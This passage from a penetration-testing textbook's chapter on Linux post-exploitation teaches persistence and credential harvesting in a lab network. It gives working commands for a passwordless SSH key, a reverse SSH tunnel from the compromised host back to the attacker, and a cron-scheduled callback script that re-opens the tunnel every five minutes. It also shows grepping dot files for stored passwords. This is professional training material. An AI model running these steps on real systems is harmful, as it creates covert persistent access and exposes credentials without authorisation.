call back
C. Schedule a crontab
    entry to execute the
    script periodically.
Figure 9.2
Setting up an SSH reverse callback script using cron
158
CHAPTER 9
Linux or UNIX post-exploitation
~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
/root/.ssh/pentestkey    
Enter passphrase (empty for no passphrase):    
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/pentestkey.    
Your public key has been saved in /root/.ssh/pentestkey.pub.
The key fingerprint is:
SHA256:6ihrocCVKdrIV5Uj25r98JtgvNQS9KCk4jHGaQU7UqM root@piccolo
The key's randomart image is:
+---[RSA 2048]----+
| .o     .       |
| oo. . +         |
|Eo .o.=o.       |
|o.++ooo.o        |
|+@o...+.S.      |
|Bo*. o.+o        |
|.o.. .*+.      |
|. o  oo +o.     |
| ..o. .. o.     |
+----[SHA256]-----+
Now, on your attacking machine, you need to place a copy of the public key you just
created in a valid user’s .ssh/authorized_keys file. I recommend creating a new user
account specifically for this purpose and removing the account when you are finished
with the engagement. (More on post-engagement cleanup activities in chapter 11.)
 Use the scp command from the compromised Linux or UNIX system to upload
the public key to your attacking machine. Listing 9.2 shows this on the compromised
host in the Capsulecorp Pentest network. 
 Of course, this host has never authenticated to your attacking system via SSH—at
least, I hope not—so the standard ECDSA key fingerprint error is to be expected.
Type yes to allow authentication. Then, when prompted, enter the password for the
user account you created on your attacking system to receive the SSH callback.
~$ scp pentestkey.pub PI:EMAIL:.ssh/authorized_keys
The authenticity of host '10.0.10.160 (10.0.10.160)' can't be established.
ECDSA key fingerprint is SHA256:a/oE02nfMZ6+2Hs2Okn3MWONrTQLd1zeaM3aoAkJTpg.
Are you sure you want to continue connecting (yes/no)? yes    
Warning: Permanently added '10.0.10.160' (ECDSA) to the list of known hosts.
PI:EMAIL's password:    
pentestkey.pub
Listing 9.1
Creating a new SSH key pair
Listing 9.2
Using scp to transfer SSH public keys
Specifies that the keys will be named 
pentestkey rather than the default id_rsa
No password 
is specified, so 
the system can 
authenticate 
without user 
interaction.
Give the key a 
unique name. 
In this case, 
“pentestkey” 
will do.
Type yes to allow
authentication.
Enter the credentials
for your SSH user.
159
Maintaining reliable re-entry with cron jobs
NOTE
Record the location of your SSH key pair on the victim machine in your
engagement notes as miscellaneous files that you’ve left on a compromised sys-
tem. You will need to remove them during post-engagement cleanup.
9.1.2
Enabling pubkey authentication 
The next thing to do is test the connectivity using the SSH keys by running ssh
PI:EMAIL, replacing royce and 10.0.10.160 with your username and IP
address. If you have never used SSH keys to authenticate to your attacking system,
then you need to make a slight modification to the /etc/ssh/sshd_config file on your
attacking machine. Open the file using sudo vim /etc/ssh/sshd_config, and navi-
gate to the line containing the PubkeyAuthentication directive. Uncomment this
line be removing the preceding # symbol, save the file, and restart your SSH service
using the sudo /etc/init.d/ssh restart command.
27 #LogLevel INFO
28 
29 # Authentication:
30 
31 #LoginGraceTime 2m
32 #PermitRootLogin prohibit-password
33 #StrictModes yes
34 #MaxAuthTries 6
35 #MaxSessions 10
36 
37 PubkeyAuthentication yes   
38 
39 # Expect .ssh/authorized_keys2 to be disregarded by default in future.
40 #AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
Finally, to verify that your SSH key is working, switch back to your victim machine and
authenticate back to the attacking system by running the ssh PI:EMAIL -i
/root/.ssh/pentestkey command. This command uses the -i operand to tell SSH
that you want to authenticate with an SSH key and where the key is located. As you can
see from the following output, you are placed directly into an authenticated bash
prompt without being asked to type your password.
~$ ssh PI:EMAIL -i /root/.ssh/pentestkey    
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-66-generic x86_64)
 * Documentation: https://help.ubuntu.com
 * Management:    https://landscape.canonical.com
 * Support:       https://ubuntu.com/advantage
 * Kata Containers are now fully integrated in Charmed Kubernetes 1.16!
Listing 9.3
Example sshd_config file enabling SSh public key authentication
Listing 9.4
Authenticating using an SSH key instead of a password
Uncomment this line, and 
then save and restart your 
SSH service.
Use -i to tell the ssh
command that you wish
to use an SSH key and
where it’s located.
160
CHAPTER 9
Linux or UNIX post-exploitation
   Yes, charms take the Krazy out of K8s Kata Kluster Konstruction.
     https://ubuntu.com/kubernetes/docs/release-notes
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
240 packages can be updated.
7 updates are security updates.
*** System restart required ***
Last login: Fri Jan 24 12:44:12 2020 from 10.0.10.204
It’s always important to remember that you are a professional consultant first and a
simulated attacker second. Whenever possible, use encryption to communicate with a
compromised target on your client’s network. Linux and UNIX environments are per-
fect for this because you can tunnel your callback through an encrypted SSH session.
This ensures that nobody (perhaps a real attacker who is penetrating the network at
the same time you are) can eavesdrop on your network traffic and capture potentially
sensitive information such as usernames and passwords for business-critical systems.
9.1.3
Tunneling through SSH
Now that your attacking machine is ready to receive connections from your victim, you
need to create a simple bash script that will initiate an SSH tunnel from your victim
machine to your attacking machine. What I mean by SSH tunnel is that the victim
machine will initiate an SSH connection and use port-forwarding to set up an SSH lis-
tener on your attacking machine, which you can use to authenticate back to the victim.
Don’t worry if that sounds strange at first—I’ll first walk you through the concept and
then demonstrate how it’s done:
1
Assume that SSH is listening on the victim machine’s localhost address on TCP
port 22. This is an extremely common configuration, so this is a safe assumption.
2
Establish an SSH tunnel from the victim machine to your attacking machine
using the SSH key pair you created.
3
While establishing the tunnel, simultaneously use the native SSH port-forwarding
capabilities to forward TCP port 22 to a remote port of your choosing on your
attacking machine—for example, port 54321, because it’s likely not already in
use.
4
From the attacking machine, you can now connect to your localhost IP address
on port 54321, which is the SSH service that is listening on your victim
machine.
All of this “magic,” as I like to call it, can be set up with a single command: 
ssh -N -R 54321:localhost:22 PI:EMAIL -I /root/.ssh/pentestkey
161
Maintaining reliable re-entry with cron jobs
You run the command from the compromised host (victim machine). It might seem a
bit strange at first, so take a look at figure 9.3 for a graphical representation of what’s
going on. 
 Before running the command, let’s break it down piece by piece. First up is -N, and
the SSH manpages say the following: “Do not execute a remote command. This is useful
for just forwarding ports.” That’s straightforward. The next section, -R 54321:local-
host:22, might need a bit more explaining. 
 The -R operand says you want to forward a port on this (the victim machine)
machine to another machine (your attacking machine): a remote machine, hence the
letter R. You then have to specify three things: 
 The port you want to use on your remote machine 
 The IP address or hostname of the local system (the victim machine). In this
case it’s localhost, or you could use the IP address 127.0.0.1 for the same result. 
 The port from the local machine (the remote port) that you want to forward to
your remote machine.
The rest of the command should already be familiar: PI:EMAIL is the user-
name and IP address used to access the remote machine (in this case, your attacking
system), and -i /root/.ssh/pentestkey says that you are going to use an SSH key
instead of a password. Now let’s run the command on the compromised Linux host
from the Capsulecorp Pentest network and see what happens:
~$ ssh -N -R 54321:localhost:22 PI:EMAIL -i /root/.ssh/pentestkey
Interestingly, the command appears to hang; you don’t see a prompt or any sign that
something is happening. But if you head over to your attacking machine and run
netstat -ant |grep -i listen, you will see port 54321 listening on your machine.
The following listing shows what you can expect to see from the netstat command
after initiating the SSH tunnel from the compromised Linux host.
ssh pentest@localhost -p 54321
ssh -N -R 54321:localhost:22 PI:EMAIL
SSH listening
on port 22
Victim machine:
10.0.10.170
SSH tunnel
PI:EMAIL#~
Terminal
Figure 9.3
Forwarding ports 
through an SSH tunnel
162
CHAPTER 9
Linux or UNIX post-exploitation
~$ netstat -ant |grep -i listen
tcp        0      0 127.0.0.1:54321         0.0.0.0:*         LISTEN    
tcp        0      0 127.0.0.53:53           0.0.0.0:*         LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*         LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*         LISTEN     
tcp        0      0 127.0.0.1:5432          0.0.0.0:*         LISTEN     
tcp6       0      0 ::1:54321               :::*              LISTEN     
tcp6       0      0 :::22                   :::*              LISTEN     
tcp6       0      0 ::1:631                 :::*              LISTEN
Port 54321 on your attacking machine is actually the forwarded port 22 from the vic-
tim machine. Now that the SSH tunnel has successfully been established, you can
securely and reliably connect to the victim machine using any account for which you
have credentials. Later, in section 9.3, you learn how to insert a backdoor user account
into the /etc/passwd file, which is a perfect combo with this technique for establish-
ing reliable re-entry into a compromised Linux or UNIX system.
ssh pentest@localhost -p 54321
The authenticity of host '[localhost]:54321 ([127.0.0.1]:54321)' can't be
established.
ECDSA key fingerprint is SHA256:yjZxJMWtD/EXza9u/23cEGq4WXDRzomHqV3oXRLTlW0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:54321' (ECDSA) to the list of known
hosts.
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-66-generic x86_64)
140 packages can be updated.
5 updates are security updates.
*** System restart required ***
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
root@piccolo:~#
9.1.4
Automating an SSH tunnel with cron
At last, you can automate the SSH tunnel and schedule a cron job to initiate the con-
nection automatically. Create a small bash script called /tmp/callback.sh, and paste in
Listing 9.5
Displaying listening ports with netstat
Listing 9.6
Connecting to a tunneled SSH port
Port 54321 is now listening 
on your attacking machine.
163
Harvesting credentials
the code from listing 9.7. Don’t forget to modify the port number, username, IP
address, and path to SSH key for your environment. 
 This script contains a single function named createTunnel that runs the familiar
SSH command to establish the SSH port forwarding you just learned about in section
9.1.3. When run, the script uses /bin/pidof to check whether the system has a run-
ning process named ssh. If not, it calls the function and initiates the SSH tunnel.
#!/bin/bash
createTunnel(){
  /usr/bin/ssh -N -R 54321:localhost:22 PI:EMAIL -i 
   ➥ /root/.ssh/pentestkey
}       
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
  createTunnel
fi
Next, to modify the permissions of your script so that it is executable, run chmod 700
/tmp/callback.sh. Now use crontab -e to add the following entry to the crontab on
your victim machine:
*/5 * * * * /tmp/callback.sh
This executes your callback.sh script every five minutes. Even if the compromised sys-
tem reboots, you will be able to reliably re-enter for the duration of your engagement.
Simply exit your text editor, and your cron job is scheduled. Check your attacking sys-
tem with the command netstat -ant |grep -i listen. In five minutes, you will
have your SSH tunnel and can log in and out of the system as you please using what-
ever credentials you have on that host, including the pentest backdoor account you
will set up in section 9.3.2.
NOTE
Record the location of your bash script in your engagement notes as a
miscellaneous file that you’ve left on a compromised system. You will need to
remove it during post-engagement cleanup.
9.2
Harvesting credentials
Linux and UNIX systems are known to store users’ application-configuration prefer-
ences and customizations in files that have a period or dot in front of the filename. The
term .dot files (pronounced “dot files”) is widely accepted among Linux and UNIX
enthusiasts when discussing these files, so that is the term we’ll use in this chapter.
 After compromising a Linux or UNIX system, the first thing you should do is
check the home directory of the user as whom you’re accessing the system for .dot
files and .dot directories. In most cases, that home directory is /home/username. By
default, these files and folders are hidden on most systems, so the ls -l terminal
Listing 9.7
Contents of the callback.sh script
164
CHAPTER 9
Linux or UNIX post-exploitation
command won’t display them. That said, you can view the files by using the ls -la
command. If you run this command from the home directory on your Ubuntu VM,
the output is similar to the next listing. As you can see, there are a number of .dot files
and directories. Because these files are customizable by the user, you never know what
you might find in them.
drwx------  6 royce royce     4096 Jul 11  2019 .local
-rw-r--r--  1 royce royce      118 Apr 11  2019 .mkshrc
drwx------  5 royce royce     4096 Apr 11  2019 .mozilla
drwxr-xr-x  9 royce royce     4096 Apr 12  2019 .msf4
drwxrwxr-x  3 royce royce     4096 Jul 15  2019 .phantomjs
-rw-r--r--  1 royce royce     1043 Apr 11  2019 .profile
-rw-------  1 royce royce     1024 Jul 11  2019 .rnd
drwxr-xr-x 25 royce royce     4096 Apr 11  2019 .rvm
drwx------  2 royce royce     4096 Jan 24 12:36 .ssh
-rw-r--r--  1 royce royce        0 Apr 10  2019 .sudo_as_admin_successful
Recall from chapter 8 that you can use native Windows OS commands to quickly and
programmatically search through files in bulk for the existence of specific strings of
text. The same is true for Linux and UNIX. To demonstrate, switch into the .msf4
directory of your Ubuntu VM with the command cd ~/.msf4, and type grep -R
"password:". You will see the password that you specified when setting up Metasploit:
./database.yml: password: msfpassword
The idea is that the system administrators responsible for maintaining the machine
that you have compromised probably installed third-party applications such as web
servers, databases, and who knows what else. The chances are high that if you search
through enough .dot files and directories, you will identify some credentials. 
Listing 9.8
Hidden .dot files and directories 
Be careful when using “password” as a search term
You probably noticed in the grep command that we searched for “password:” with
an MSF password colon instead of just “password”. This is because the word pass-
word probably exists thousands of times throughout hundreds of files on your com-
promised machine in the form of developer comments saying things like, “Here is
where we get the password from the user.” 
To avoid sifting through all of this useless output, you should use a more targeted
search string such as “password=” or “password:”. You should also assume that